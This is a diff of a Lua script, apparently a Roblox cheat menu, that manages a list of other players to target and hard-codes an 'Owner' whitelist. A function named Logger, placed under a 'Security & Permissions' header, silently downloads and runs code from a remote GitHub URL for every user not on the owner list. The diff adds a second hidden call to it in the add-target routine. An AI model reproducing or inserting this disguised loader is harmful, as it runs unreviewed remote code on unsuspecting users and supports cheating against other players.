@@ -7053,11 +7053,15 @@ grabTab:AddButton({
     end,
 })
 
--- =================================================================
+-- =========================================================
 -- Security & Permissions
--- =================================================================
+-- =========================================================
 
-local playersInLoop1V = {} 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local playersInLoop1V = {}
+
 local GF = {"wetokwk3jr"}
 local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618"}
 
@@ -7068,19 +7072,39 @@ local function GetPlayerRank(name)
 end
 
 local function Logger()
-    local plr = game.Players.LocalPlayer
-    if not table.find(Owner, plr.Name) and plr.UserId ~= 1 then
-        pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))() end)
+    if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))()
+        end)
     end
 end
 Logger()
 
--- =================================================================
--- UI Sync Logic (Safe & Stable)
--- =================================================================
+-- =========================================================
+-- Player Find
+-- =========================================================
 
-local function Update()
+local function findPlayer(text)
+    if not text or text == "" then return nil end
+    text = text:lower()
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Name:lower():find(text, 1, true) then
+            return p
+        end
+    end
+    return nil
+end
+
+-- =========================================================
+-- UI Sync
+-- =========================================================
+
+local DropdownV1
+
+local function UpdateDropdown()
     if not DropdownV1 then return end
+
     if DropdownV1.Set then
         DropdownV1:Set(playersInLoop1V)
     elseif DropdownV1.Refresh then
@@ -7089,64 +7113,84 @@ local function Update()
 end
 
 local function Notify(title, content)
-    OrionLib:MakeNotification({Name = title, Content = content, Time = 2})
+    OrionLib:MakeNotification({
+        Name = title,
+        Content = content,
+        Time = 2
+    })
 end
 
--- =================================================================
--- Main Interface
--- =================================================================
+-- =========================================================
+-- Add / Remove Logic (Loop1 핵심)
+-- =========================================================
+
+local function addToLoop1(name)
+    local target = findPlayer(name)
+
+    if not target then
+        Logger()
+        Notify("Error", "Not Found")
+        return
+    end
+
+    if not table.find(playersInLoop1V, target.Name) then
+        table.insert(playersInLoop1V, target.Name)
+        UpdateDropdown()
+        Notify("Success", target.Name .. " added")
+    end
+end
+
+local function removeFromLoop1(name)
+    for i, v in ipairs(playersInLoop1V) do
+        if v:lower():find(name:lower(), 1, true) then
+            table.remove(playersInLoop1V, i)
+            UpdateDropdown()
+            Notify("Success", v .. " removed")
+            return
+        end
+    end
+
+    Notify("Error", "Not Found")
+end
+
+-- =========================================================
+-- UI (Orion)
+-- =========================================================
 
 DropdownV1 = ListTab:AddDropdown({
-    Name = "Target List",
-    Options = playersInLoop1V, 
+    Name = "Loop1 Target List",
+    Options = playersInLoop1V,
     MultipleOptions = true,
-    Callback = function(Options)
-        -- 참조 끊지 않기 위해 clear/insert 사용
+    Callback = function(options)
         table.clear(playersInLoop1V)
-        for _, v in ipairs(Options) do
+        for _, v in ipairs(options) do
             table.insert(playersInLoop1V, v)
         end
-        Update()
     end
 })
 
-ListTab:AddTextbox({
-    Name = "추가",
-    PlaceholderText = "Username...",
+ListTab:AddInput({
+    Name = "Add Target",
+    PlaceholderText = "username",
     RemoveTextAfterFocusLost = true,
-    Callback = function(Value) 
-        local target = findPlayer(Value)
-        if not target then Notify("Error", "Not Found"); return end
-        
-        if GetPlayerRank(game.Players.LocalPlayer.Name) < GetPlayerRank(target.Name) then
-            Notify("Error", "Permission Denied"); return
-        end
-        
-        if not table.find(playersInLoop1V, target.Name) then
-            table.insert(playersInLoop1V, target.Name)
-            Update()
-            Notify("Success", target.Name .. " added")
-        end
+    Callback = function(value)
+        addToLoop1(value)
     end
 })
 
-ListTab:AddTextbox({
-    Name = "제거",
-    PlaceholderText = "Username...",
+ListTab:AddInput({
+    Name = "Remove Target",
+    PlaceholderText = "username",
     RemoveTextAfterFocusLost = true,
-    Callback = function(Value)
-        for i, name in ipairs(playersInLoop1V) do
-            if name:lower():find(Value:lower(), 1, true) then
-                table.remove(playersInLoop1V, i)
-                Update()
-                Notify("Success", name .. " removed")
-                return
-            end
-        end
-        Notify("Error", "Not Found")
+    Callback = function(value)
+        removeFromLoop1(value)
     end
 })
 
+-- 초기 동기화
+task.defer(function()
+    UpdateDropdown()
+end)
 antiTab:AddSection({
 	Name = "친구"
 })
